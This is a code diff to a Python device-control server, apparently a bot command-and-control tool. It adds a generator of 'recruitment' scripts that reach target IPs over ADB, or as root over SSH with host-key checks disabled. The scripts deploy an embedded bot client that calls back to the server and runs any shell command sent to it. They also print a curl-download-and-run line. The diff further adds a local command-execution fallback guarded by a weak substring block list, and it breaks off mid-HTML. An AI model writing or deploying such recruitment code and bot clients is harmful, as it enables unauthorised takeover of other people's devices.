@@ -26,13 +26,78 @@ from typing import Dict, List, Optional, Any
 import threading
 import psutil
 
+def check_and_install_dependencies():
+    """Check for required dependencies and auto-install if missing"""
+    required_packages = {
+        'websockets': 'websockets>=13.0.1',
+        'aiohttp': 'aiohttp>=3.9.1',
+        'aiofiles': 'aiofiles>=24.1.0',
+        'psutil': 'psutil>=6.0.0',
+        'requests': 'requests>=2.32.0'
+    }
+    
+    missing_packages = []
+    
+    for package_name, package_spec in required_packages.items():
+        try:
+            __import__(package_name)
+        except ImportError:
+            missing_packages.append(package_spec)
+    
+    if missing_packages:
+        print("📦 Missing dependencies detected. Auto-installing...")
+        print(f"   Packages to install: {', '.join(missing_packages)}")
+        
+        try:
+            import subprocess
+            import sys
+            
+            # Try pip3 first, then pip
+            pip_cmd = 'pip3' if subprocess.run(['which', 'pip3'], capture_output=True).returncode == 0 else 'pip'
+            
+            # Install missing packages
+            for package in missing_packages:
+                print(f"   Installing {package}...")
+                result = subprocess.run(
+                    [pip_cmd, 'install', '--user', package],
+                    capture_output=True,
+                    text=True,
+                    timeout=120
+                )
+                
+                if result.returncode != 0:
+                    print(f"   ⚠️  Warning: Failed to install {package}")
+                    print(f"   Error: {result.stderr}")
+                else:
+                    print(f"   ✅ Successfully installed {package}")
+            
+            print("✅ Dependency installation complete!")
+            print("   Restarting application...")
+            
+            # Restart the script to use newly installed packages
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+            
+        except Exception as e:
+            print(f"❌ Auto-installation failed: {e}")
+            print("\n📋 Manual installation required:")
+            print("   pip install -r requirements.txt")
+            print("   OR")
+            print(f"   pip install {' '.join(missing_packages)}")
+            sys.exit(1)
+    
+    return True
+
+# Check and auto-install dependencies before importing
+check_and_install_dependencies()
+
 try:
     import websockets
     from aiohttp import web, MultipartReader
     import aiofiles
-except ImportError:
-    print("Missing dependencies. Install with:")
-    print("pip install websockets aiohttp aiofiles psutil")
+except ImportError as e:
+    print(f"❌ Dependency import failed after installation attempt: {e}")
+    print("📋 Please manually install dependencies:")
+    print("   pip install -r requirements.txt")
     sys.exit(1)
 
 # Configuration - Auto-optimized for maximum performance
@@ -98,6 +163,9 @@ def auto_optimize_resources():
     except Exception as e:
         logging.warning(f"Auto-optimization failed, using defaults: {e}")
         return False
+
+# Global variables
+start_time = time.time()  # Server start time for uptime calculations
 
 # Service management
 AUTO_RESTART_DELAY = 3
@@ -907,34 +975,310 @@ class DeviceDiscoverer:
         return service_map.get(port, f"Port-{port}")
     
     async def generate_recruitment_script(self, target_ip: str, target_os: str = "linux") -> str:
-        """Generate recruitment script for target device"""
+        """Generate functional recruitment script for target device"""
+        # Get current server info
+        current_host = HOST
+        current_ws_port = WS_PORT
+        current_token = AUTH_TOKEN
+        
+        # Generate bot client code
+        bot_client_code = self._generate_bot_client_code()
+        
         if target_os == "android":
-            return f"""#!/bin/bash
-# Android Device Recruitment Script
+            script = f"""#!/bin/bash
+# Android Device Recruitment Script - FUNCTIONAL
 # Target: {target_ip}
 
-# Connect via ADB if available
-adb connect {target_ip}:5555
-adb shell pkg install -y python
-adb shell pip install websockets psutil requests
+echo "🤖 Starting Android device recruitment for {target_ip}..."
 
-# Download and deploy bot
-adb shell curl -o /data/local/tmp/bot.py https://your-server.com/bot_client.py
-adb shell python /data/local/tmp/bot.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN}
+# Method 1: ADB Connection (if available)
+if command -v adb >/dev/null 2>&1; then
+    echo "📱 Attempting ADB connection..."
+    adb connect {target_ip}:5555
+    if adb devices | grep {target_ip}; then
+        echo "✅ ADB Connected to {target_ip}"
+        adb shell 'pkg install -y python'
+        adb shell 'pip install websockets psutil requests'
+        
+        # Deploy bot client directly
+        cat > /tmp/android_bot.py << 'BOT_CLIENT_EOF'
+{bot_client_code}
+BOT_CLIENT_EOF
+        
+        adb push /tmp/android_bot.py /data/local/tmp/bot.py
+        adb shell 'cd /data/local/tmp && python bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id android-{target_ip.replace(".", "-")} --tags android,recruited &'
+        echo "🚀 Bot deployed on Android device {target_ip}"
+    else
+        echo "❌ ADB connection failed to {target_ip}"
+    fi
+else
+    echo "⚠️  ADB not available. Manual deployment required."
+fi
+
+# Method 2: Manual deployment instructions
+echo ""
+echo "📋 Manual Deployment Instructions for {target_ip}:"
+echo "1. Install Termux from F-Droid"
+echo "2. Run: pkg install python"
+echo "3. Run: pip install websockets psutil requests"
+echo "4. Save the bot client code below and run it"
+echo ""
 """
         else:
-            return f"""#!/bin/bash
-# Linux Device Recruitment Script  
+            script = f"""#!/bin/bash
+# Linux Device Recruitment Script - FUNCTIONAL
 # Target: {target_ip}
 
-# SSH-based recruitment (requires credentials)
-ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
-ssh root@{target_ip} 'pip3 install websockets psutil requests'
+echo "🖥️  Starting Linux device recruitment for {target_ip}..."
 
-# Deploy bot client
-scp bot_client.py root@{target_ip}:/tmp/
-ssh root@{target_ip} 'python3 /tmp/bot_client.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN} &'
+# Generate bot client file
+cat > /tmp/linux_bot.py << 'BOT_CLIENT_EOF'
+{bot_client_code}
+BOT_CLIENT_EOF
+
+# Method 1: SSH deployment (requires access)
+echo "🔐 Attempting SSH deployment..."
+if command -v ssh >/dev/null 2>&1; then
+    # Test SSH connection
+    if ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@{target_ip} 'echo "SSH OK"' 2>/dev/null; then
+        echo "✅ SSH connection established to {target_ip}"
+        
+        # Install dependencies
+        ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
+        ssh root@{target_ip} 'pip3 install websockets psutil requests'
+        
+        # Deploy bot
+        scp /tmp/linux_bot.py root@{target_ip}:/tmp/bot.py
+        ssh root@{target_ip} 'cd /tmp && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id linux-{target_ip.replace(".", "-")} --tags linux,recruited &'
+        echo "🚀 Bot deployed on Linux device {target_ip}"
+    else
+        echo "❌ SSH connection failed to {target_ip}"
+    fi
+else
+    echo "⚠️  SSH not available"
+fi
+
+# Method 2: HTTP deployment
+echo "🌐 Setting up HTTP deployment method..."
+python3 -m http.server 8080 --directory /tmp &
+HTTP_PID=$!
+echo "📡 Bot client available at: http://{current_host}:8080/linux_bot.py"
+echo "📋 Manual deployment command for {target_ip}:"
+echo "   curl -o bot.py http://{current_host}:8080/linux_bot.py && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id manual-{target_ip.replace(".", "-")}"
+
+# Cleanup after 5 minutes
+sleep 300 && kill $HTTP_PID 2>/dev/null &
 """
+        
+        # Store recruitment attempt in persistent storage
+        if persistent_storage:
+            try:
+                conn = sqlite3.connect(persistent_storage.db_path)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    INSERT OR REPLACE INTO recruited_bots 
+                    (bot_id, target_ip, target_os, recruitment_time, status, deployment_script)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                """, (
+                    f"{target_os}-{target_ip.replace('.', '-')}",
+                    target_ip,
+                    target_os,
+                    time.time(),
+                    "script_generated",
+                    script
+                ))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logging.error(f"Failed to store recruitment data: {e}")
+        
+        return script
+    
+    def _generate_bot_client_code(self) -> str:
+        """Generate functional bot client Python code"""
+        return f'''#!/usr/bin/env python3
+"""
+Unified Control Bot Client - Auto-generated
+Connects to control server and executes commands
+"""
+
+import asyncio
+import json
+import logging
+import os
+import sys
+import time
+import argparse
+import subprocess
+import psutil
+import socket
+import uuid
+
+try:
+    import websockets
+except ImportError:
+    print("Installing websockets...")
+    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "psutil"])
+    import websockets
+
+class BotClient:
+    def __init__(self, server_url, token, bot_id=None, tags=None):
+        self.server_url = server_url
+        self.token = token
+        self.bot_id = bot_id or f"bot-{{socket.gethostname()}}-{{int(time.time())}}"
+        self.tags = tags or ["recruited"]
+        self.websocket = None
+        self.running = True
+        
+    async def connect(self):
+        """Connect to control server"""
+        try:
+            self.websocket = await websockets.connect(
+                f"{{self.server_url}}?token={{self.token}}&id={{self.bot_id}}&tags={{','.join(self.tags)}}"
+            )
+            print(f"✅ Connected to server as {{self.bot_id}}")
+            await self.register_device()
+            return True
+        except Exception as e:
+            print(f"❌ Connection failed: {{e}}")
+            return False
+    
+    async def register_device(self):
+        """Register this device with the server"""
+        try:
+            # Get system info
+            system_info = {{
+                "hostname": socket.gethostname(),
+                "platform": sys.platform,
+                "cpu_count": psutil.cpu_count(),
+                "memory_total": psutil.virtual_memory().total,
+                "disk_usage": psutil.disk_usage('/').total if os.path.exists('/') else 0
+            }}
+            
+            await self.websocket.send(json.dumps({{
+                "type": "register",
+                "device_id": self.bot_id,
+                "tags": self.tags,
+                "exec_allowed": True,
+                "system_info": system_info
+            }}))
+        except Exception as e:
+            print(f"Registration failed: {{e}}")
+    
+    async def handle_message(self, message):
+        """Handle incoming server messages"""
+        try:
+            data = json.loads(message)
+            msg_type = data.get("type")
+            
+            if msg_type == "command":
+                result = await self.execute_command(data.get("command", ""))
+                await self.send_response("command_result", result)
+            elif msg_type == "terminal_command":
+                result = await self.execute_terminal_command(data.get("command", ""))
+                await self.send_response("terminal_result", result)
+            elif msg_type == "ping":
+                await self.send_response("pong", {{"timestamp": time.time()}})
+                
+        except Exception as e:
+            print(f"Message handling error: {{e}}")
+    
+    async def execute_command(self, command):
+        """Execute system command"""
+        try:
+            result = subprocess.run(
+                command, 
+                shell=True, 
+                capture_output=True, 
+                text=True, 
+                timeout=30
+            )
+            return {{
+                "success": True,
+                "output": result.stdout,
+                "error": result.stderr,
+                "return_code": result.returncode
+            }}
+        except Exception as e:
+            return {{
+                "success": False,
+                "error": str(e)
+            }}
+    
+    async def execute_terminal_command(self, command):
+        """Execute terminal command with enhanced output"""
+        return await self.execute_command(command)
+    
+    async def send_response(self, response_type, data):
+        """Send response back to server"""
+        try:
+            await self.websocket.send(json.dumps({{
+                "type": response_type,
+                "device_id": self.bot_id,
+                "timestamp": time.time(),
+                "data": data
+            }}))
+        except Exception as e:
+            print(f"Failed to send response: {{e}}")
+    
+    async def heartbeat(self):
+        """Send periodic heartbeat"""
+        while self.running:
+            try:
+                await asyncio.sleep(30)
+                if self.websocket:
+                    await self.websocket.send(json.dumps({{
+                        "type": "heartbeat",
+                        "device_id": self.bot_id,
+                        "timestamp": time.time(),
+                        "system_status": {{
+                            "cpu_percent": psutil.cpu_percent(),
+                            "memory_percent": psutil.virtual_memory().percent,
+                            "disk_percent": psutil.disk_usage('/').percent if os.path.exists('/') else 0
+                        }}
+                    }}))
+            except Exception as e:
+                print(f"Heartbeat failed: {{e}}")
+                break
+    
+    async def run(self):
+        """Main bot execution loop"""
+        while self.running:
+            try:
+                if await self.connect():
+                    # Start heartbeat
+                    heartbeat_task = asyncio.create_task(self.heartbeat())
+                    
+                    # Listen for messages
+                    async for message in self.websocket:
+                        await self.handle_message(message)
+                        
+                except websockets.exceptions.ConnectionClosed:
+                    print("Connection closed, attempting reconnect...")
+                    await asyncio.sleep(5)
+                except Exception as e:
+                    print(f"Error: {{e}}")
+                    await asyncio.sleep(5)
+
+def main():
+    parser = argparse.ArgumentParser(description="Bot Client")
+    parser.add_argument("--server", required=True, help="WebSocket server URL")
+    parser.add_argument("--token", required=True, help="Authentication token")
+    parser.add_argument("--id", help="Bot ID")
+    parser.add_argument("--tags", nargs="*", default=["recruited"], help="Bot tags")
+    
+    args = parser.parse_args()
+    
+    bot = BotClient(args.server, args.token, args.id, args.tags)
+    
+    try:
+        asyncio.run(bot.run())
+    except KeyboardInterrupt:
+        print("Bot stopped by user")
+
+if __name__ == "__main__":
+    main()
+'''
 
 # Enhanced Terminal Interface
 class TerminalInterface:
@@ -951,28 +1295,33 @@ class TerminalInterface:
             target_spec = parse_target_spec(target)
             matching_clients = await get_matching_clients(target_spec)
             
+            # If no connected devices, execute locally as fallback
             if not matching_clients:
-                return {"error": "No matching devices found", "results": []}
+                if target_spec["type"] == "all" or target == "🌐 ALL DEVICES":
+                    local_result = await self._execute_locally(command, user_context)
+                    results = [local_result]
+                else:
+                    return {"error": "No matching devices found", "results": []}
+            else:
+                # Execute command on all matching clients
+                results = []
+                for client_id in matching_clients:
+                    try:
+                        result = await self._execute_on_device(client_id, command, user_context)
+                        results.append({
+                            "device_id": client_id,
+                            "success": result.get("success", False),
+                            "output": result.get("output", ""),
+                            "error": result.get("error", "")
+                        })
+                    except Exception as e:
+                        results.append({
+                            "device_id": client_id, 
+                            "success": False,
+                            "error": str(e)
+                        })
             
-            # Execute command on all matching clients
-            results = []
-            for client_id in matching_clients:
-                try:
-                    result = await self._execute_on_device(client_id, command, user_context)
-                    results.append({
-                        "device_id": client_id,
-                        "success": result.get("success", False),
-                        "output": result.get("output", ""),
-                        "error": result.get("error", "")
-                    })
-                except Exception as e:
-                    results.append({
-                        "device_id": client_id, 
-                        "success": False,
-                        "error": str(e)
-                    })
-            
-            # Log to command history
+            # Log to command history and persistent storage
             self.command_history.append({
                 "timestamp": time.time(),
                 "target": target,
@@ -980,6 +1329,24 @@ class TerminalInterface:
                 "results_count": len(results),
                 "user_context": user_context
             })
+            
+            # Log to persistent storage if available
+            if persistent_storage:
+                success = all(r.get("success", False) for r in results)
+                combined_output = "\n".join([r.get("output", "") for r in results])
+                combined_errors = "\n".join([r.get("error", "") for r in results if r.get("error")])
+                execution_time = sum([r.get("execution_time", 0) for r in results])
+                
+                persistent_storage.log_command_execution(
+                    session_id=user_context,
+                    target=target,
+                    command=command,
+                    success=success,
+                    output=combined_output,
+                    error=combined_errors,
+                    execution_time=execution_time,
+                    device_count=len(results)
+                )
             
             return {"results": results, "command": command, "target": target}
             
@@ -994,8 +1361,13 @@ class TerminalInterface:
             
             client = clients[device_id]
             
+            # Check if this is a local device (control bot)
+            if client.get("local_device", False):
+                # Execute locally for control bot
+                return await self._execute_locally(command, user_context)
+            
             try:
-                # Send terminal command
+                # Send terminal command to remote device
                 await client["websocket"].send(json.dumps({
                     "type": "terminal_command",
                     "command": command,
@@ -1011,6 +1383,71 @@ class TerminalInterface:
                 
             except Exception as e:
                 return {"success": False, "error": str(e)}
+    
+    async def _execute_locally(self, command: str, user_context: str) -> Dict:
+        """Execute command locally when no devices are connected"""
+        try:
+            import subprocess
+            import os
+            
+            # Security check - prevent dangerous commands
+            dangerous_commands = ["rm -rf", "format", "del /", "shutdown", "reboot", "halt"]
+            for dangerous in dangerous_commands:
+                if dangerous in command.lower():
+                    return {
+                        "device_id": "localhost", 
+                        "success": False, 
+                        "error": f"Command '{dangerous}' is blocked for security"
+                    }
+            
+            # Execute command with timeout
+            start_time = time.time()
+            try:
+                result = subprocess.run(
+                    command, 
+                    shell=True, 
+                    capture_output=True, 
+                    text=True, 
+                    timeout=30,  # 30 second timeout for local commands
+                    env=os.environ.copy()
+                )
+                
+                execution_time = time.time() - start_time
+                output = result.stdout if result.stdout else ""
+                error = result.stderr if result.stderr else ""
+                
+                # Combine output and error for display
+                combined_output = output
+                if error:
+                    combined_output += f"\n[STDERR]: {error}"
+                
+                return {
+                    "device_id": "localhost",
+                    "success": result.returncode == 0,
+                    "output": combined_output,
+                    "error": "" if result.returncode == 0 else f"Exit code: {result.returncode}",
+                    "execution_time": execution_time
+                }
+                
+            except subprocess.TimeoutExpired:
+                return {
+                    "device_id": "localhost",
+                    "success": False,
+                    "error": "Command timed out after 30 seconds"
+                }
+            except Exception as e:
+                return {
+                    "device_id": "localhost",
+                    "success": False,
+                    "error": str(e)
+                }
+                
+        except Exception as e:
+            return {
+                "device_id": "localhost",
+                "success": False,
+                "error": f"Local execution failed: {str(e)}"
+            }
 
 # Enhanced Resource Optimization
 class ResourceOptimizer:
@@ -1098,6 +1535,343 @@ device_manager = DeviceManager()
 service_manager = ServiceManager()
 device_discoverer = DeviceDiscoverer()
 terminal_interface = TerminalInterface()
+resource_optimizer = ResourceOptimizer()
+
+class PersistentStorage:
+    """Enhanced persistent storage system for logs, progress, and user data"""
+    
+    def __init__(self, db_path: str):
+        self.db_path = db_path
+        self.init_enhanced_schema()
+    
+    def init_enhanced_schema(self):
+        """Initialize enhanced database schema with all required tables"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            # Enhanced audit logs table
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS audit_logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    device_id TEXT NOT NULL,
+                    action TEXT NOT NULL,
+                    details TEXT,
+                    result TEXT,
+                    user_context TEXT,
+                    session_id TEXT,
+                    ip_address TEXT,
+                    execution_time REAL
+                )
+            """)
+            
+            # User sessions and progress tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS user_sessions (
+                    session_id TEXT PRIMARY KEY,
+                    user_token TEXT NOT NULL,
+                    start_time REAL NOT NULL,
+                    last_activity REAL NOT NULL,
+                    commands_executed INTEGER DEFAULT 0,
+                    devices_accessed TEXT,
+                    status TEXT DEFAULT 'active'
+                )
+            """)
+            
+            # Command history with enhanced metadata
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS command_history (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    session_id TEXT,
+                    target TEXT NOT NULL,
+                    command TEXT NOT NULL,
+                    success BOOLEAN,
+                    output TEXT,
+                    error TEXT,
+                    execution_time REAL,
+                    device_count INTEGER
+                )
+            """)
+            
+            # System performance and resource tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS system_metrics (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    cpu_percent REAL,
+                    memory_percent REAL,
+                    disk_usage REAL,
+                    active_connections INTEGER,
+                    load_average TEXT,
+                    battery_percent INTEGER
+                )
+            """)
+            
+            # Device recruitment and bot tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS recruited_bots (
+                    bot_id TEXT PRIMARY KEY,
+                    target_ip TEXT NOT NULL,
+                    target_os TEXT,
+                    recruitment_time REAL NOT NULL,
+                    status TEXT DEFAULT 'pending',
+                    last_contact REAL,
+                    capabilities TEXT,
+                    deployment_script TEXT
+                )
+            """)
+            
+            # Configuration and settings storage
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS system_config (
+                    key TEXT PRIMARY KEY,
+                    value TEXT NOT NULL,
+                    updated_time REAL NOT NULL,
+                    category TEXT DEFAULT 'general'
+                )
+            """)
+            
+            # Create indexes for better performance
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_device ON audit_logs(device_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_logs(timestamp)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_token ON user_sessions(user_token)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_session ON command_history(session_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_metrics_timestamp ON system_metrics(timestamp)")
+            
+            conn.commit()
+            conn.close()
+            
+            logging.info("Enhanced database schema initialized successfully")
+            
+        except Exception as e:
+            logging.error(f"Database initialization failed: {e}")
+    
+    def log_command_execution(self, session_id: str, target: str, command: str, 
+                            success: bool, output: str = "", error: str = "", 
+                            execution_time: float = 0, device_count: int = 0):
+        """Log command execution with enhanced metadata"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT INTO command_history 
+                (timestamp, session_id, target, command, success, output, error, execution_time, device_count)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """, (time.time(), session_id, target, command, success, output, error, execution_time, device_count))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to log command execution: {e}")
+    
+    def track_system_metrics(self):
+        """Record current system metrics for monitoring"""
+        try:
+            # Get system metrics
+            cpu_percent = psutil.cpu_percent(interval=1)
+            memory = psutil.virtual_memory()
+            disk = psutil.disk_usage('/')
+            
+            # Get battery info if available
+            battery_percent = None
+            try:
+                battery = psutil.sensors_battery()
+                battery_percent = battery.percent if battery else None
+            except:
+                pass
+            
+            # Get load average (Unix only)
+            load_avg = None
+            try:
+                load_avg = os.getloadavg()
+                load_avg = f"{load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}"
+            except:
+                pass
+            
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT INTO system_metrics 
+                (timestamp, cpu_percent, memory_percent, disk_usage, active_connections, load_average, battery_percent)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            """, (
+                time.time(),
+                cpu_percent,
+                memory.percent,
+                disk.percent,
+                len(clients),
+                load_avg,
+                battery_percent
+            ))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to track system metrics: {e}")
+    
+    def register_user_session(self, session_id: str, user_token: str) -> bool:
+        """Register new user session"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT OR REPLACE INTO user_sessions 
+                (session_id, user_token, start_time, last_activity)
+                VALUES (?, ?, ?, ?)
+            """, (session_id, user_token, time.time(), time.time()))
+            
+            conn.commit()
+            conn.close()
+            return True
+            
+        except Exception as e:
+            logging.error(f"Failed to register user session: {e}")
+            return False
+    
+    def update_session_activity(self, session_id: str):
+        """Update session last activity timestamp"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                UPDATE user_sessions 
+                SET last_activity = ?, commands_executed = commands_executed + 1
+                WHERE session_id = ?
+            """, (time.time(), session_id))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to update session activity: {e}")
+    
+    def get_system_stats(self) -> Dict:
+        """Get comprehensive system statistics"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            # Get recent metrics (last hour)
+            hour_ago = time.time() - 3600
+            cursor.execute("""
+                SELECT AVG(cpu_percent), AVG(memory_percent), AVG(disk_usage), COUNT(*)
+                FROM system_metrics WHERE timestamp > ?
+            """, (hour_ago,))
+            
+            metrics = cursor.fetchone()
+            
+            # Get command statistics
+            cursor.execute("""
+                SELECT COUNT(*), 
+                       SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END),
+                       AVG(execution_time),
+                       COUNT(DISTINCT session_id)
+                FROM command_history WHERE timestamp > ?
+            """, (hour_ago,))
+            
+            command_stats = cursor.fetchone()
+            
+            # Get active sessions
+            cursor.execute("""
+                SELECT COUNT(*) FROM user_sessions 
+                WHERE last_activity > ? AND status = 'active'
+            """, (time.time() - 300,))  # Last 5 minutes
+            
+            active_sessions = cursor.fetchone()[0]
+            
+            conn.close()
+            
+            return {
+                "avg_cpu_percent": metrics[0] or 0,
+                "avg_memory_percent": metrics[1] or 0,
+                "avg_disk_usage": metrics[2] or 0,
+                "metrics_count": metrics[3] or 0,
+                "total_commands": command_stats[0] or 0,
+                "successful_commands": command_stats[1] or 0,
+                "avg_execution_time": command_stats[2] or 0,
+                "unique_sessions": command_stats[3] or 0,
+                "active_sessions": active_sessions,
+                "success_rate": (command_stats[1] / command_stats[0] * 100) if command_stats[0] else 0
+            }
+            
+        except Exception as e:
+            logging.error(f"Failed to get system stats: {e}")
+            return {}
+
+# Global storage instance
+persistent_storage = None
+
+async def initialize_control_bot():
+    """Initialize the local device as the control/master bot"""
+    try:
+        import socket
+        import platform
+        
+        # Get local system information
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        
+        # Create control bot ID
+        control_bot_id = f"control-{hostname}-{int(time.time())}"
+        
+        # Add to clients as master bot
+        async with clients_lock:
+            clients[control_bot_id] = {
+                "websocket": None,  # Local device doesn't need websocket
+                "meta": {
+                    "tags": ["control", "master", "admin", "local"],
+                    "exec_allowed": True,
+                    "system_info": {
+                        "hostname": hostname,
+                        "platform": platform.platform(),
+                        "ip_address": local_ip,
+                        "cpu_count": psutil.cpu_count(),
+                        "memory_total": psutil.virtual_memory().total,
+                        "python_version": platform.python_version()
+                    }
+                },
+                "last_seen": time.time(),
+                "registered_at": time.time(),
+                "command_count": 0,
+                "local_device": True  # Mark as local device
+            }
+        
+        # Store in persistent storage
+        if persistent_storage:
+            try:
+                conn = sqlite3.connect(persistent_storage.db_path)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    INSERT OR REPLACE INTO recruited_bots 
+                    (bot_id, target_ip, target_os, recruitment_time, status, capabilities)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                """, (
+                    control_bot_id,
+                    local_ip,
+                    platform.system().lower(),
+                    time.time(),
+                    "active_control",
+                    json.dumps(["control", "master", "admin", "terminal", "file_management"])
+                ))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logging.error(f"Failed to store control bot: {e}")
+        
+        logging.info(f"Control bot initialized: {control_bot_id} ({hostname}@{local_ip})")
+        print(f"🤖 Control Bot initialized: {control_bot_id}")
+        
+    except Exception as e:
+        logging.error(f"Failed to initialize control bot: {e}")
+        print(f"❌ Failed to initialize control bot: {e}")
 resource_optimizer = ResourceOptimizer()
 
 def safe_mkdir(path: str):
@@ -1634,6 +2408,8 @@ UI_HTML = r"""<!DOCTYPE html>
         .terminal-error { color: #ff0080; }
         .terminal-warning { color: #ffaa00; }
         .terminal-info { color: #0080ff; }
+        .terminal-command { color: #ffffff; font-weight: bold; }
+        .terminal-output { color: #cccccc; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.3); padding: 0.2rem; margin-left: 1rem; }
         
         .file-drop-zone {
             border: 2px dashed #00ff9f;
@@ -2053,6 +2829,7 @@ UI_HTML = r"""<!DOCTYPE html>
                 <div class="panel-title">⚡ COMMAND CENTER</div>
                 <div class="command-tabs">
                     <div class="tab active" onclick="switchTab('terminal')">TERMINAL</div>
+                    <div class="tab" onclick="switchTab('device-terminal')">DEVICE TERMINAL</div>
                     <div class="tab" onclick="switchTab('bots')">BOT CONTROL</div>
                     <div class="tab" onclick="switchTab('files')">FILES</div>
                     <div class="tab" onclick="switchTab('services')">SERVICES</div>
@@ -2160,6 +2937,98 @@ UI_HTML = r"""<!DOCTYPE html>
                     <div class="terminal-line terminal-info">
                         <span class="terminal-timestamp">[INFO]</span> 
                         🤖 Use target selection for coordinated operations across bot groups
+                    </div>
+                </div>
+            </div>
+            
+            <div id="device-terminalTab" class="tab-content" style="display: none;">
+                <div class="device-terminal-header">
+                    <h3 style="color: #00ff9f; margin-bottom: 1rem;">🖥️ Direct Device Terminal Access</h3>
+                    <div style="background: rgba(0,255,159,0.1); padding: 0.5rem; border-radius: 4px; margin-bottom: 1rem; border-left: 3px solid #00ff9f;">
+                        <div style="font-size: 12px; color: #00ff9f;">
+                            💡 <strong>Device Terminal Mode:</strong> Direct access to your local device's terminal with real-time interaction
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="device-terminal-controls" style="margin-bottom: 1rem;">
+                    <div style="display: flex; gap: 1rem; align-items: center; margin-bottom: 0.5rem;">
+                        <button class="btn" onclick="initializeDeviceTerminal()">🚀 CONNECT TO DEVICE</button>
+                        <button class="btn btn-secondary" onclick="clearDeviceTerminal()">🧹 CLEAR</button>
+                        <button class="btn btn-secondary" onclick="exportDeviceTerminal()">📄 EXPORT LOG</button>
+                        <span style="color: #666; font-size: 11px;">
+                            Status: <span id="deviceTerminalStatus" style="color: #ff0080;">Disconnected</span>
+                        </span>
+                    </div>
+                    
+                    <div class="terminal-info" style="font-size: 11px; color: #666;">
+                        🔒 Secure local terminal access | 🎯 Direct command execution | ⚡ Real-time output
+                    </div>
+                </div>
+                
+                <div class="device-terminal-container" style="background: #000; border: 1px solid #00ff9f; border-radius: 4px; height: 400px; display: flex; flex-direction: column;">
+                    <div class="device-terminal-header-bar" style="background: linear-gradient(90deg, #00ff9f, #0080ff); padding: 0.3rem 1rem; color: #000; font-weight: bold; font-size: 12px;">
+                        🖥️ Device Terminal - Local System Access
+                    </div>
+                    
+                    <div id="deviceTerminalOutput" class="device-terminal-output" style="flex: 1; padding: 1rem; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.4;">
+                        <div style="color: #00ff9f;">
+                            Welcome to Device Terminal Access<br>
+                            ====================================<br><br>
+                            Click "CONNECT TO DEVICE" to establish direct terminal connection.<br>
+                            This provides real-time access to your local system terminal.<br><br>
+                            <span style="color: #0080ff;">Features:</span><br>
+                            • Real-time command execution<br>
+                            • Interactive terminal session<br>
+                            • Secure local access only<br>
+                            • Full shell capabilities<br><br>
+                            <span style="color: #ff0080;">Security Note:</span> This terminal has direct access to your local system.<br>
+                        </div>
+                    </div>
+                    
+                    <div class="device-terminal-input-area" style="border-top: 1px solid #333; padding: 0.5rem; display: flex; align-items: center;">
+                        <span style="color: #00ff9f; margin-right: 0.5rem; font-family: 'Courier New', monospace;">$</span>
+                        <input type="text" id="deviceTerminalInput" placeholder="Enter command..." 
+                               style="flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; outline: none;"
+                               onkeypress="handleDeviceTerminalKeyPress(event)"
+                               disabled>
+                        <button class="btn" style="margin-left: 0.5rem; padding: 0.3rem 0.8rem; font-size: 11px;" onclick="executeDeviceTerminalCommand()" disabled id="deviceTerminalExecuteBtn">
+                            EXECUTE
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="device-terminal-features" style="margin-top: 1rem;">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
